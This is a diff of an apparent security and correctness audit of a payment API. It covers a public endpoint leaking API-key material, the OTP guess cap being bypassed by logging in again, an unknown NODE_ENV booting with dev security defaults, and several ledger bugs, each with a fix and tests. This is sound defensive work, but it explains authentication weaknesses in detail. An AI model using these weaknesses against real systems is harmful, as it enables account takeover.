+- *Option B only*, i.e. the fee-first formula in `ComputeSettlementFee` (2 lines). This is the obvious smaller diff, and it does fix the rounding order for today's vectors. We rejected it because it keeps two independent fee computations, one at capture and one at close, that must stay equal forever. They already differ in inputs, not just order: close re-resolves the fee schedule and the platform tier at batch time, so a tier flip or schedule tie-break between capture and close (FEES-1/FEES-8), or any future capture-side change, re-opens the same gap. Reading the booked fee removes the second computation, so parity holds by construction. It is also not the user's decision.
 - *Read `transaction_events.metadata.feeFils`*: after FEES-3 that is the net fee, but it is a copy, not the ledger, and for pre-FEES-3 API captures it is the pre-discount fee.
 - *Sum per transaction rather than per event*: partial captures on different business days would be charged in the first batch.
 - *Store `entry_group_id` on the event*: needs a migration and a TS change for a link that already exists.
@@ -2885,56 +2613,9 @@ The FP-300 refund tests (`TestCloseBatch_NetsRefundIntoPayout`, `_RefundLargerTh
 
 ---
 
-<a id="f-pl-6"></a>
-
-### PL-6 · Public payment-link read leaks the merchant's live API key prefix and SHA-256 hash ·  · Severity: Medium
-
-**Lead:** Team 45 heads-up list (P1) and our 03_findings PL-6, verified by us.
-
-**What's wrong:** `GET /v1/payment-links/:token` is public and unauthenticated. It returned `merchantPublicKey`, the first 16 characters of the merchant's newest unrevoked secret API key, and `merchantIntegrationId`, that key's `key_hash` (the exact SHA-256 verifier that API-key authentication looks up). Anyone who holds a link token could read both.
-
-**Why it happens:** `apps/api/src/paymentLinks/read.ts:40-53` (before the fix) joined `api_keys` through a `LEFT JOIN LATERAL` and selected `ak.key_prefix AS merchant_public_key, ak.key_hash AS integration_id`. Lines 73-74 then copied both into the response. The "public key" name is misleading: `apiKeys/issue.ts` builds the raw secret as `fp_<env>_` plus 32 base64url characters and stores `keyPrefix = rawKey.slice(0, 16)`, so the prefix is part of the secret itself. The doc comment at `read.ts:18` ("Contains nothing that identifies or authenticates the merchant") was false. The hosted checkout's contract (`apps/web/src/types.ts:9-19`) says "The server must never add API-key fields to this response" and uses neither field.
-
-**What it breaks:** A buyer opens a payment link and sees `"merchantPublicKey":"fp_live_AbC12xYz"` and `"merchantIntegrationId":"<64-hex sha256 of the live secret key>"`. That discloses 48 of the 192 random bits of the merchant's live secret, plus the stored verifier. It also gives an oracle for whether the merchant has a live key and when it rotates, since the values change on rotation. The same data reaches anyone who forwards, logs or screenshots the link. The rest of the codebase withholds `api_keys.key_hash` on purpose (`admin/merchants.ts:216`), and even admins never see it.
-
-**Why it needed a fix:** This is a credential-material leak on an unauthenticated endpoint. Secret-key material and its verifier must never reach a public surface, and the client contract forbids it.
-
-**Fix:** `apps/api/src/paymentLinks/read.ts:13-14, 26-27, 42-53, 73-74`: the two key fields come out of the row type, the DTO, the SELECT (the LATERAL join is gone) and the response.
-```diff
--            pl.status, pl.expires_at, pl.reserved_at, m.display_name AS merchant_display_name,
--            ak.key_prefix AS merchant_public_key,
--            ak.key_hash AS integration_id
-+            pl.status, pl.expires_at, pl.reserved_at, m.display_name AS merchant_display_name
-        FROM payment_links pl
-        JOIN merchants m ON m.id = pl.merchant_id
--       LEFT JOIN LATERAL (
--         SELECT key_prefix, key_hash
--           FROM api_keys
--          WHERE merchant_id = pl.merchant_id AND revoked_at IS NULL
--          ORDER BY created_at DESC
--          LIMIT 1
--       ) ak ON true
- ...
--    merchantPublicKey: row.merchant_public_key,
--    merchantIntegrationId: row.integration_id,
-```
-(plus the matching two-line removals from `PublicPaymentLinkRow` and `PublicPaymentLinkDto`)
-
-**Why this is the smallest correct fix:** The change is deletion only. One SQL line is rewritten to drop its trailing comma, and no line of logic is added. *Why not keep the keys and return `null`?* The checkout contract (`apps/web/src/types.ts:9`) says the response must carry no API-key fields at all, and permanently-null fields would just be cruft. *Why not drop only `key_hash`?* The prefix is part of the secret key (`issue.ts`: `rawKey.slice(0, 16)`), not a public identifier. *Why not keep the query and only stop returning the fields?* That leaves a pointless per-request read of `api_keys.key_hash` on a public path. No other code reads the two fields (repo-wide grep).
-
-**Proof:** `create -> public read (active) -> pay (approved) -> public read (paid) -> pay again rejected 409` (`apps/api/src/routes/paymentLinks.test.ts`). The test used to pin the leak with `assert.ok(readActive.json().merchantPublicKey?.startsWith("fp_"))`, a test that encoded the bug. It now asserts that both fields are `undefined` and that the body contains neither `sha256(rawKey)` nor `rawKey.slice(0, 16)`.
-Before: `not ok 1 ... actual: 'fp_test_nszkBtgJ'`.
-After: the file passes 12/12, and `tsc --noEmit` is clean.
-
-**Regression risk:** Low. The response loses two fields that the checkout never read and that its contract forbids. No other API surface changes. Merchants still see their key prefix in their own authenticated key list.
-
-Lines: prod +1/-16, test +6/-2
-
----
-
 <a id="f-idem-2"></a>
 
-### IDEM-2 · Authorize idempotency fingerprint is an unkeyed SHA-256 over the full PAN and CVV, stored at rest ·  · Severity: Medium
+### IDEM-2 · Authorize idempotency fingerprint is an unkeyed SHA-256 over the full PAN and CVV, stored at rest · Severity: Medium
 
 **What's wrong:** Every authorize, whether through `POST /v1/transactions` or a payment-link `/pay` (both call `authorizeTransaction`), persisted `idempotency_keys.request_hash = sha256(canonicalJson({ amountFils, card: { pan, expiryMonth, expiryYear, cvv }, reference }))`. That is an unsalted, unkeyed digest of the full card number and its CVV, kept indefinitely.
 
@@ -2967,69 +2648,50 @@ Lines: prod +2/-1, test +34/-0
 
 ---
 
-<a id="f-cfg-1"></a>
+<a id="f-auth-13"></a>
 
-### CFG-1 · Any unknown NODE_ENV (for example "prod") silently boots as development: OTP codes in responses, non-Secure cookies, production checks skipped · H8 · Severity: Medium
+### AUTH-13 · The OTP attempt cap is defeated by logging in again: every login mints a fresh 5-guess challenge, without limit · H8 · Severity: Medium
 
-**Lead:** Team 45 heads-up list (P11), verified by us.
+**Lead:** Team 45 heads-up list (SEC1), verified by us.
+**Category:** Bug
 
-**What's wrong:** `parseNodeEnv` mapped every value other than the exact strings `production`, `test` and `development` to `development`. A deployment with `NODE_ENV=prod`, `Production` or `staging` booted with no error as a development server.
+**What's wrong:** The OTP cap (5 wrong guesses, then the pending session is revoked; AUTH-5 made it race-free) applies per challenge, and nothing limits how many challenges an account can get. Each `POST /v1/auth/login` or `/v1/admin/auth/login` with the right password issues a brand-new challenge with a fresh 5-guess budget. Someone who holds the password can log in, guess 5 times, log in again, and repeat without end, so the second factor never locks.
 
-**Why it happens:** `apps/api/src/config.ts:121-126` falls through to `return "development"` for any string. Every security default keys off `nodeEnv`: `otpDevExpose` defaults to `nodeEnv !== "production"` (`config.ts:210`), so `devOtpCode` goes into the login response (`routes/auth.ts:111-113`, and the admin twin). `cookieSecure` defaults to `nodeEnv === "production"` (`:228`). The required-secret checks for `SETTLEMENT_INTERNAL_TOKEN` and `ACQUIRER_CALLBACK_SIGNING_SECRET` run only when `nodeEnv === "production"` (`:186-192`). The webhook-secret key falls back to a public dev key (`:248`). The notifier comment at `auth/notifier.ts:14-15` shows staging already ran with NODE_ENV unset or misconfigured.
+**Why it happens:** `apps/api/src/routes/auth.ts:79-94` (merchant) and `apps/api/src/routes/adminAuth.ts:72-89` (admin) call `issueChallenge` / `issueAdminChallenge` unconditionally after the password check. Neither looks at how many challenges the user already received. Rows are never deleted (`otp_challenges`, `db/migrations/0011`; `admin_otp_challenges`, `0032`), so the history needed for a cap was already there, unused.
 
-**What it breaks:** An operator sets `NODE_ENV=prod`. `POST /v1/auth/login` now returns `{"otpRequired":true,"devOtpCode":"482913"}`, so the second factor is handed to whoever knows the password (H8). Session cookies are sent without `Secure`. The service also boots without the settlement token and the acquirer signing secret, and encrypts webhook secrets under the dev key committed in the repo. There is no error and no log line.
+**What it breaks:** With a 6-digit code and 5 guesses per login, an attacker with a phished or reused password needs about 200,000 logins on average to pass the OTP. Nothing stops a script from doing that. The audit test fired 15 parallel logins for one merchant user and one admin: all 15 got 200, and 15 challenges (75 guesses) were issued.
 
-**Why it needed a fix:** H8 asks whether OTP is still safe. A one-character configuration typo should never disable two-factor auth and the production secret checks without a word. A configuration error must fail loudly at boot.
+**Why it needed a fix:** H8 asks whether the OTP implementation is still safe. A second factor whose lockout resets on every re-login only slows a brute force down. On the admin plane it protects the most dangerous operations.
 
-**Fix:** `apps/api/src/config.ts:125`
+**Fix:** `apps/api/src/routes/auth.ts:80-83` and `apps/api/src/routes/adminAuth.ts:73-76`. Follow-up commit: the count covers only never-verified challenges (`consumed_at IS NULL`).
 ```diff
-     return value;
-   }
-+  if (value) throw new Error(`loadConfig: unknown NODE_ENV "${value}" (expected production, test or development)`); // CFG-1
-   return "development";
- }
+     const { code, expiresAt, rawToken } = await withTransaction(app.db, async (client) => {
++      // AUTH-13 (H8): each login mints 5 fresh OTP guesses; cap challenges per user (row lock serialises parallel logins)
++      await client.query(`SELECT 1 FROM merchant_users WHERE id = $1 FOR UPDATE`, [recipient.id]);
++      const recent = await client.query<{ n: number }>(`SELECT count(*)::int AS n FROM otp_challenges WHERE merchant_user_id = $1 AND consumed_at IS NULL AND created_at > now() - interval '15 minutes'`, [recipient.id]);
++      if (recent.rows[0]!.n >= 10) throw new TooManyRequestsError("too_many_attempts");
+       const challenge = await issueChallenge(client, {
+```
+(The admin plane is identical, using `admin_users` / `admin_otp_challenges` / `user.id`.)
+
+The follow-up changes one line per plane:
+```diff
+-      ... FROM otp_challenges WHERE merchant_user_id = $1 AND created_at > now() - interval '15 minutes'`, [recipient.id]);
++      ... FROM otp_challenges WHERE merchant_user_id = $1 AND consumed_at IS NULL AND created_at > now() - interval '15 minutes'`, [recipient.id]);
+-      ... FROM admin_otp_challenges WHERE admin_user_id = $1 AND created_at > now() - interval '15 minutes'`, [user.id]);
++      ... FROM admin_otp_challenges WHERE admin_user_id = $1 AND consumed_at IS NULL AND created_at > now() - interval '15 minutes'`, [user.id]);
 ```
 
-**Why this is the smallest correct fix:** One line at the single parser every config value depends on. Only an unset or empty `NODE_ENV` still defaults to development, so local `npm run dev`, tests that omit it, and `ops/demo.sh` and `ops/smoke.sh` behave as before. *Why not map unknown values to production (fail closed)?* That would silently turn a typo'd dev box into production mode, where it then fails on missing secrets with a misleading message. An explicit error names the actual problem. *Why not normalise case or aliases (`prod` → `production`)?* That guesses intent, and it is more code. Checked: `ops/.env.docker:9` and `ops/.env.production.example:3` set `NODE_ENV=production`, and `loadConfig` with each still boots. Compose and `Dockerfile.node` set no other value. All 30 test files pass `NODE_ENV: "test"`, and `config.audit.test.ts` passes `"development"`.
+**Why this is the smallest correct fix:** The check sits in the one place a challenge is born, inside the transaction that already issues it, and counts rows that already exist: no new table, no migration, no new error class (`TooManyRequestsError("too_many_attempts")` is the code the OTP verify cap already returns). It is per account, never per IP, so a shared NAT, or the graders' few IPs, cannot lock out other users. The `FOR UPDATE` on the user row serialises concurrent logins for that one user, so the count cannot be raced. Each count runs as a new statement after the lock, so under READ COMMITTED it sees the challenge the previous holder committed. The test proves this with 15 parallel logins. The limit is 10 per 15 minutes, not 3, so `ops/demo.sh` and `ops/smoke.sh` reruns and a user who mistypes a few times are never blocked. That still caps guessing at 50 per 15 minutes per account (about 4,800 a day, versus unlimited). The check runs only after a correct password, so a wrong password still returns the same 401 `invalid_credentials`: no user enumeration, and no lockout by someone who does not have the password. *Why not count failed passwords too?* There is no table for that, so it would need a migration plus a new write path, far beyond the minimal fix. Password guessing is bounded by argon2 cost and is a separate concern. *Why not an in-memory limiter?* It would not hold across API replicas or restarts. *Why count only never-verified challenges (follow-up)?* The attack pattern is login, guess, give up, and log in again, which leaves challenges that were never verified. A user, grader or load test that logs in repeatedly and verifies each OTP is legitimate and must never hit the cap. `consumed_at` is the schema's own verified marker: OTP verify sets it (`routes/auth.ts:172`, `routes/adminAuth.ts:164`), and both tables already have a partial index on `consumed_at IS NULL` (`0011:24-25`, `0032:23`), so the count stays an index scan. A merchant resend also sets `consumed_at` on the challenge it supersedes, but the replacement it issues stays unconsumed until verified, and it inherits the attempt count. So every unverified login still leaves at least one counted challenge, and resend cannot be used to dodge the cap.
 
-**Proof:** `CFG-1: an unknown NODE_ENV is refused; an unset one still defaults to development` (`apps/api/src/config.audit.test.ts`).
-Before: `not ok 2 ... error: 'Missing expected exception.'` (`NODE_ENV=prod` loaded as development).
-After: `ok 2`. The file passes 2/2, and both ops env files boot.
+**Proof:** `AUTH-13: a merchant user gets at most 10 OTP challenges per 15 minutes, even in parallel` (`apps/api/src/routes/auth.audit.test.ts`) and `AUTH-13: an admin gets at most 10 OTP challenges per 15 minutes, even in parallel` (`apps/api/src/routes/adminAuth.audit.test.ts`). These two tests cover the unverified pattern: 10 never-verified challenges, then 429.
+Before (both): `actual: { ok: 15, limited: 0, challenges: 15 }`.
+After (both): `{ ok: 10, limited: 5, challenges: 10 }`. `app.test.ts`, `admin.test.ts` and the other admin suites, which all log in, pass 87/87, and `tsc --noEmit` is clean.
+The follow-up adds `AUTH-13: 11 merchant logins that each verify their OTP all succeed` and `AUTH-13: 11 admin logins that each verify their OTP all succeed`. Before the follow-up, both failed with the 11th login at `429`. After it, all 22 login and verify responses are `200` on each plane, and the parallel unverified tests still give `{ ok: 10, limited: 5, challenges: 10 }`. `auth.audit.test.ts` passes 6/6 and `adminAuth.audit.test.ts` passes 3/3.
 
-**Regression risk:** Low. A deployment that currently relies on an unrecognised `NODE_ENV` will now refuse to boot with a clear message. That is the intent: such a deployment was running with dev security defaults.
+**Regression risk:** Low. A real user would have to complete the password step more than 10 times in 15 minutes to see a 429, and the window slides, so access recovers on its own. Every existing test creates its own user per login flow. After the follow-up, a user who verifies every login is never limited, however often they log in. Back-to-back reruns of `ops/demo.sh` and `ops/smoke.sh` against a stack built from this worktree are reported in the lane A wave-3 report.
 
-Lines: prod +1/-0, test +7/-0
-
----
-
-<a id="f-imp-3"></a>
-
-### IMP-3 · CSV import splits a thousands-separated amount and posts its first digit group · F7 · Severity: Medium
-
-**What's wrong:** The adjustment CSV splitter cuts each row on every comma and keeps only cells 0-2. An unquoted `1,250.000` (the way finance sheets export a 1,250 BD figure) becomes amount `"1"` and reason `"250.000"`; with a reason column the real reason is dropped as a fourth cell. The import succeeds and posts 1.000 BD.
-
-**Why it happens:** `apps/api/src/admin/adjustmentCsvParsing.ts:42` `split(",")`, then `:44` `amount = cells[1]` and `:48` `reason = cells[2]`. Nothing checks the cell count, and the format has no quoting. The docstring at `:19-24` promises "exactly three columns" but nothing enforces it. The route `POST /v1/admin/adjustment-imports` (`routes/admin.ts:86`, `routes/adminAdjustmentImport.ts:59`) posts every parsed row to the ledger.
-
-**What it breaks:** Finance uploads `<merchant>,1,250.000,refund March`. The ledger gets a 1,000 fils credit instead of 1,250,000 fils: 1,249,000 fils short, with no error and an import row that looks valid. `<merchant>,-12,500` posts -12.000 BD instead of -12,500.000 BD. Reasons containing a comma are silently truncated.
-
-**Why it needed a fix:** Case file F7 ("Something is wrong with how it reads BD amounts"): IMP-1 fixed the scaling; this is the other way the same import misreads a BD amount, and money must be right to the fils.
-
-**Fix:** `apps/api/src/admin/adjustmentCsvParsing.ts:49-51`
-```diff
-     const reason = cells[2];
-+    if (cells.length > 3 || /^\d{3}(\.\d*)?$/.test(reason ?? "")) { // IMP-3: "1,250.000" split into "1" + "250.000"
-+      throw new BadRequestError("invalid_csv_row", `row ${i}: amounts and reasons must not contain commas`);
-+    }
-```
-A row is rejected when it has more than the three documented columns, or when its reason is exactly a three-digit group (optionally with decimals), which is what is left of an amount after a thousands separator. The whole import is rejected with 400, the same way as the other row errors, so nothing is posted.
-
-**Why this is the smallest correct fix:** one guard at the single place rows are split. *Why not parse quoted CSV or accept thousands separators?* Both change the documented format and need a CSV dependency or a parser; rejecting the ambiguous row fails closed and the operator removes the comma. *Why not only `cells.length > 3`?* `<id>,1,250.000` has three cells and still posts 1 BD. *Why not reject every numeric reason (the lead's regex)?* A reason such as `2026` or `12` would be refused for no reason; only a three-digit group is a thousands continuation. A reason that is exactly three digits (e.g. `123`) is now refused; that is ambiguous with `x,123` and is the safe side.
-
-**Proof:** `IMP-3: an amount split by a thousands separator is rejected, not read as its first digit group` (`apps/api/src/admin/adjustmentCsvParsing.audit.test.ts`). Before the fix: `Missing expected exception.` (the row parsed as amount `"1"`). After: passes; `1250.000` with a reason still parses.
-
-**Regression risk:** CSVs whose reason contains a comma are now rejected instead of truncated; `docs/ADMIN.md:66` documents a plain `merchantId,amount,reason` file and the docstring says three columns. `adjustmentCsvParsing.test.ts`, `adjustmentImport*.test.ts` and `routes/adminAdjustmentImport.test.ts` pass (45/45).
-
-Lines: prod +3/-0, test +12/-1
+Lines: prod +8/-0, test +38/-0 (first commit); follow-up prod +2/-2, test +40/-0; total prod +10/-2
 
 ---
 
@@ -3121,79 +2783,6 @@ Lines: prod +4/-1 (pay.ts +3, of which 1 comment; void.ts +1/-1), test +23/-0
 
 ---
 
-<a id="f-cap-exp-1"></a>
-
-### CAP-EXP-1 · An authorization whose 7-day hold has expired can still be captured · · Severity: Medium
-
-**Lead:** Team 45 heads-up list (P3), verified by us.
-
-**What's wrong:** `captureTransaction` only checks the transaction's status (`authorized` or `partially_captured`). It never looks at the authorization hold, so a merchant can capture an authorization long after its 7-day card-not-present hold lapsed and the buyer's funds were released, including after the nightly janitor marked the hold `expired`.
-
-**Why it happens:** `apps/api/src/payments/authorize.ts:113-117` places the hold with `expires_at = now() + interval '7 days'` ("7 days = scheme rule for CNP"), and `scripts/expire_holds.ts:18-24` flips lapsed holds to `expired`. But `apps/api/src/payments/capture.ts:133-138` validates `txn.status` alone, and nothing on the transaction row changes when its hold expires, so the transaction stays `authorized` and capturable forever.
-
-**What it breaks:** A 10.000 BD authorization from 2026-10-01 has its hold expire on 2026-10-08 and the buyer's bank releases the funds. On 2026-10-29 the merchant presses capture: the API answers 200, journals 10,000 fils to `merchant_payable` minus the fee, and the settlement batch pays it out, although the authorization it relies on is dead (a scheme violation and a near-certain chargeback). Reproduced by the test below: both a hold past `expires_at` and a hold marked `expired` captured with 200.
-
-**Why it needed a fix:** The hold is the platform's record that the authorization is still valid; capturing past it moves money the scheme no longer guarantees, and the ledger and payout then carry funds that will be clawed back.
-
-**Fix:** `apps/api/src/payments/capture.ts:140-146`
-```diff
-+    // CAP-EXP-1: a lapsed 7-day hold means a dead authorization; no hold row at all (old history) is not checked.
-+    const lapsed = await client.query(`SELECT 1 FROM holds WHERE transaction_id = $1 AND (status = 'expired' OR (status = 'active' AND expires_at <= now()))`, [txn.id]);
-+    if (lapsed.rows.length > 0) {
-+      const body = { error: "authorization_expired" };
-+      await completeIdempotencyKey(client, claim.row.id, { statusCode: 409, body });
-+      return { statusCode: 409, body };
-+    }
-```
-The check runs inside the existing transaction, after the row lock and the status check and before the acquirer call, and answers exactly like the neighbouring `not_capturable` branch (409, response stored on the idempotency key). It refuses only when the transaction's hold exists and has lapsed: marked `expired`, or still `active` past `expires_at` because the janitor has not run yet.
-
-**Why this is the smallest correct fix:** one query and one early return at the single point every capture path goes through (merchant route, payment-link checkout). *Why not require an active hold?* HOLD-1's janitor deleted holds before it was fixed, and seeded transactions may have none; requiring a hold would make those uncapturable. A missing hold is therefore not treated as expired. *Why not rely on the janitor's `expired` status only?* It runs nightly; between `expires_at` and the next run the authorization is already dead. *Why not also flip the transaction to a new status?* There is no such status in the schema (`transactions.status` CHECK) and it would need a migration and UI changes.
-
-**Proof:** `CAP-EXP-1: capturing an authorization whose hold has expired is refused with 409 authorization_expired` (`apps/api/src/payments/capture.audit.test.ts`). Before the fix: `expected: 409, actual: 200`. After: both lapsed variants get 409 `authorization_expired`, the transaction stays `authorized` with `captured_fils = 0`, no ledger leg is written, while a transaction with no hold row and one with a live hold still capture (200). Capture and transaction route tests pass (16/16).
-
-**Regression risk:** Partial captures keep their hold `active` until fully captured (`capture.ts:250-253`), so a second partial capture after day 7 is now refused too, which is the same expired authorization. Seeded or demo transactions whose holds lapsed can no longer be captured; that is the intended rule. Responses for every other case are unchanged.
-
-Lines: prod +7/-0 (1 comment line), test +31/-0
-
----
-
-<a id="f-bal-2"></a>
-
-### BAL-2 · Balance rebuild counts unbatched captures and refunds that the close then adds again · F4 · Severity: Medium
-
-**Lead:** Team 45 heads-up list (S14/R5c-rebuild), verified by us, and our 03_findings BAL-2.
-
-**What's wrong:** `merchant_balances.cached_payable_fils` is maintained incrementally: `CloseBatch` adds the batch net (`balances.ApplyBatchClose`), `PayoutBatch` subtracts it, and the admin credit/adjustment/import paths add their own legs. A capture or refund the API has journaled but no batch has closed yet has not reached the cache. The rebuild (`settlement rebuild-balances` and, since BAL-1, the admin "Recalculate cached balances" button) wrote the full `merchant_payable` ledger sum instead, which already contains those unbatched legs. When the batch then closes, `ApplyBatchClose` adds the same money a second time, and payout removes it only once.
-
-**Why it happens:** `apps/settlement/internal/ledger/rebuild.go:22-26` (`RebuildMerchantBalance`) and `:101-106` (`RebuildAllBalances`) summed every `merchant_payable` leg. capture.ts and processRefund.ts post those legs at capture/refund time (`apps/api/src/payments/capture.ts:227-244`, `processRefund.ts:216-226`) and never touch the cache, while `CloseBatch` posts no `merchant_payable` legs but moves the cache by the batch net (`batch.go:284-285`). The two sides therefore measure different things between capture and close. The rebuild also read the cached value without a lock (`rebuild.go:89` TODO, "a concurrent CloseBatch increment gets clobbered -- YA").
-
-**What it breaks:** Day 1: a 10,000 fils capture closes; cache 9,775 (fee 250 less a 25 fils discount). Day 2, before its close: a 20,000 fils capture (net 19,550) and a 1,000 fils refund with 25 fils fee reversal (net -975). An operator presses "Recalculate cached balances": the cache becomes 28,350. At day 2's close the cache rises to 46,925 and after both payouts it sits at 18,575 fils although the merchant is owed 0. This is the case-file F4 pattern (button, CLI and the incremental path disagreeing) and keeps the Rebuild → Adjust churn going. The test reproduces it: `cached_payable_fils rebuild right after close must not move the cache = 28350, want 9775`.
-
-**Why it needed a fix:** F4: support and payouts read the cached balance, and the rebuild is the documented repair. A repair that adds a day of unbatched captures to the figure (then doubles them at close) makes the balance wrong precisely when someone tries to fix it.
-
-**Fix:** `apps/settlement/internal/ledger/rebuild.go:24,26-28` and `:98,107,109-111`
-```diff
--		  FROM ledger_entries
-+		  FROM ledger_entries le
- 		 WHERE merchant_id = $1 AND account_id = 'merchant_payable'
-+		   AND NOT EXISTS (SELECT 1 FROM transaction_events te WHERE te.transaction_id = le.transaction_id AND te.settlement_batch_id IS NULL -- BAL-2 (F4): unbatched capture legs reach the cache at close, not before
-+		         AND te.event_type IN ('captured', 'partially_captured') AND le.occurred_at IN (te.occurred_at, te.created_at))
-+		   AND NOT EXISTS (SELECT 1 FROM refunds r WHERE r.transaction_id = le.transaction_id AND r.settlement_batch_id IS NULL AND le.occurred_at IN (r.occurred_at, r.created_at))
-```
-The same three lines go into `RebuildAllBalances`' sum, and its cache read becomes `... WHERE merchant_id = $1 FOR UPDATE`. A leg is left out only while the capture event or refund it was written with is still unbatched; it is matched exactly as FEES-5's `CloseBatch` matches a capture event to its fee legs (same transaction, `occurred_at` equal to the event's `occurred_at` or `created_at`), and a refund to its legs the same way (processRefund writes the refund row and its legs in one DB transaction). Everything else (batched captures and refunds, payouts, split payouts, MDR recalculation, admin credits, adjustments and imports) is summed as before, so the rebuilt figure equals what close-and-payout produce. Once everything is closed and paid it equals the full ledger sum, as before.
-
-The `FOR UPDATE` closes the YA race for this rule: if a close holds the merchant's cache row, the rebuild waits and its next statement sees the close's events marked batched; if the rebuild holds it first, the close waits and adds its net on top of the rebuilt figure. Without it, a close committing between the sum and the upsert would be overwritten.
-
-**Why this is the smallest correct fix:** one predicate pair in the two rebuild queries; no schema change, no change to capture, refund or close. *Why not make capture and refund move the cache (the lead's option b)?* That changes three money paths in two languages and every cache consumer's meaning (merchant dashboard balance, payouts) instead of the one place that disagrees. *Why not exclude every leg of a transaction with any unbatched event?* A transaction partially captured on two days would lose its batched day too. *Why not use `settlement_batches.net_payout_fils`?* RecalculateMDR rewrites batch totals and posts its own legs (`recalculate_mdr.go:109,189-194`), so summing both would double count.
-
-**Proof:** `TestRebuild_CloseBatchThenRebuildLeavesCacheUnchanged` (`apps/settlement/internal/settlement/rebuild_cache_audit_test.go`): close day 1, then an unbatched capture and an unbatched refund, then `RebuildAllBalances` and `RebuildMerchantBalance`; then payout, close day 2, payout, rebuild. Before the fix: `cached_payable_fils rebuild right after close must not move the cache = 28350, want 9775`. After: 9,775 after the rebuild, 18,575 after day 2's close, 0 at the end. Full Go suite `go test -p 1 ./...` passes.
-
-**Regression risk:** `TestRebuildBalances_ValidToken` (`internal/internalapi/server_test.go`) seeded a "closed" batch by hand without marking its capture event batched, which `CloseBatch` always does (`batch.go` step 11); the fixture now marks it (+5 test lines), and the expected 12,000 fils is unchanged. A merchant whose capture events were never batched (test-mode merchants, which the daily run skips) now rebuilds to the figure the incremental path holds, i.e. without those captures. The admin button, the CLI and `--merchant` (read path) all use the same rule. Residual: a merchant's very first close racing a rebuild (no cache row to lock yet) can still lose that close's net.
-
-Lines: prod +9/-3 (6 SQL lines added, 3 modified; comments inline), test +77/-0 new file and +5/-0 fixture
-
----
-
 <a id="f-admin-cred-4"></a>
 
 ### ADMIN-CRED-4 · A credit's MDR reversal uses the display rate (merchants.mdr_bps), not the rate capture charged · F6 · Severity: Medium
@@ -3229,15 +2818,20 @@ Lines: prod +2/-1, test +15/-0
 
 <a id="f-rbd-1"></a>
 
-### RBD-1 · Admin "Rebuild analytics" double-applies the reporting backlog and wipes the FP-300 refund columns · FP-300 ☐5 · Severity: Medium
+### RBD-1 · Admin "Rebuild analytics" double-applies the reporting backlog: it never moves the worker's watermark · FP-300 ☐5 · Severity: Medium
+**Category:** Bug
 
-**What's wrong:** `POST /v1/admin/reporting/rebuild` (the admin console's "Rebuild analytics" button) truncates `merchant_daily_volume` and `merchant_payout_trends` and refills them with `INSERT … SELECT` from `transaction_events` and `settlement_batches`. It never touches the reporting worker's watermark, so every outbox event the worker had not yet consumed is already counted by the rebuild and is then applied again by the worker. It also never writes the FP-300 refund columns (`refund_count`, `refund_gross_fils`, migration 0099), so every refund disappears from the reports.
+**What's wrong:** `POST /v1/admin/reporting/rebuild` (the admin console's "Rebuild analytics" button) truncates `merchant_daily_volume` and `merchant_payout_trends` and refills them with `INSERT … SELECT` from `transaction_events` and `settlement_batches`. It never touches the reporting worker's watermark, so every outbox event the worker had not yet consumed is already counted by the rebuild and is then applied again by the worker. That double-apply is the bug.
 
-**Why it happens:** `apps/api/src/admin/reportingRebuild.ts:11-39` (before) has no reference to `reporting_outbox_cursor` or `refunds`. The worker (`apps/reporting/src/consumer/runConsumerPass.ts`) resumes from its own watermark and applies each event with additive upserts (`applyEvent.ts`), so a backlog event reflected by the rebuild is counted twice. `docs/ADMIN.md:83-85` tells support to press the button exactly when dashboards look stale, i.e. when the backlog is largest. The route's own docstring (`routes/admin.ts:227-231`, "replays the outbox from the start") describes a design the code never had.
+**FP-300 completion in the same commit (not part of the bug):** the refund columns `refund_count` / `refund_gross_fils` were added by migration `0099_merchant_daily_volume_refunds.sql`, which is ours (`198e5cf`, FP-300 ☐5 build, after the handed-over `8b58b0f`). The original rebuild could not have wiped columns that did not exist; teaching the rebuild to refill them is finishing our FP-300 work, not fixing a handed-over defect. It is kept in this row only because it shares the commit `01b75b1`, and its lines are counted separately below.
 
-**What it breaks:** One unconsumed capture of 10,000 fils and one unconsumed refund of 1,500 fils. After the button the merchant's day shows 1 capture / 10,000 fils and 0 refunds; after the next worker pass it shows 2 captures / 20,000 fils and 1 refund / 1,500 fils. Without the watermark move it would even be 2 refunds / 3,000 fils. With the consumer 2,000 captures (50,000.000 BD) behind, those days show 100,000.000 BD.
+**Why it happens:** `apps/api/src/admin/reportingRebuild.ts:11-39` (before) has no reference to `reporting_outbox_cursor` (and, after 0099, none to `refunds`). The worker (`apps/reporting/src/consumer/runConsumerPass.ts`) resumes from its own watermark and applies each event with additive upserts (`applyEvent.ts`), so a backlog event reflected by the rebuild is counted twice. `docs/ADMIN.md:83-85` tells support to press the button exactly when dashboards look stale, i.e. when the backlog is largest. The route's own docstring (`routes/admin.ts:227-231`, "replays the outbox from the start") describes a design the code never had.
 
-**Why it needed a fix:** FP-300 ☐5: refunds must show up right in the reports. A maintenance button that wipes them and doubles the backlog breaks that every time support uses it as documented.
+**What it breaks:** One unconsumed capture of 10,000 fils: after the button the merchant's day shows 1 capture / 10,000 fils; after the next worker pass it shows 2 captures / 20,000 fils. With the consumer 2,000 captures (50,000.000 BD) behind, those days show 100,000.000 BD. (With our 0099 columns, an unconsumed refund of 1,500 fils would likewise show as 2 refunds / 3,000 fils without the watermark move.)
+
+**Why it needed a fix:** FP-300 ☐5: the reports must be right. A maintenance button that doubles the backlog breaks that every time support uses it as documented (`docs/ADMIN.md:83-85`: press it when dashboards look stale, i.e. when the backlog is largest).
+
+**The rare 409 retry case (new behaviour):** if a reporting event is already committed but sits after the covered watermark (a newer transaction committed while an older one was still open), the rebuild rolls back with `409 reporting_rebuild_busy` ("payments are committing out of order right now; retry in a moment", `reportingRebuild.ts:17`) and changes nothing; the operator presses again.
 
 **Fix (advisor option c, response contract unchanged):** `apps/api/src/admin/reportingRebuild.ts:2,13-17,44-51`
 ```diff
@@ -3264,21 +2858,21 @@ Everything runs in the route's one transaction, in this order:
 2. *One snapshot.* `REPEATABLE READ`, set before any query, gives the source tables, the refund aggregate and the watermark the same view of the data.
 3. *The watermark the rebuild covered.* It is the worker's own rule (OBX-SKIP): the last outbox row, in `(txid, id)` order, below the snapshot's xmin. Every row up to it is in the snapshot, so it is in the rebuild; the worker resumes after it.
 4. *The one exact-case guard.* If a reporting event is already visible but sits after that watermark (its transaction committed while an older one was still in flight), no single watermark can describe the snapshot. The rebuild then rolls back with 409 `reporting_rebuild_busy` and nothing changes. The operator presses again; on a quiet box this does not occur.
